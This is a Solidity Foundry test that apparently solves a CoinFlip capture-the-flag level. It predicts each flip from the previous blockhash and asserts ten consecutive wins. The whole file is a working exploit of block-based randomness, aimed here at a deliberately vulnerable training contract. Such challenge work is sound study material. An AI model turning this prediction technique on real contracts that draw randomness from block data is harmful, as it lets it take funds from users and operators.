// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "../src/CoinFlip/CoinFlip.sol";
import "../src/CoinFlip/CoinFlipFactory.sol";
import {Test} from "forge-std/Test.sol";

contract CoinFlipTest is Test {
    address _alice;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testCoinFlip() public {
        CoinFlipFactory factory = new CoinFlipFactory();
        address instance = factory.createInstance(_alice);
        CoinFlip coinFlip = CoinFlip(payable(instance));
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(i + 1);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 val = blockValue /
                57896044618658097711785492504343953926634992332820282019728792003956564819968;
            if (val == 1) {
                coinFlip.flip(true);
            } else {
                coinFlip.flip(false);
            }
        }
        assertEq(coinFlip.consecutiveWins(), 10);
    }
}
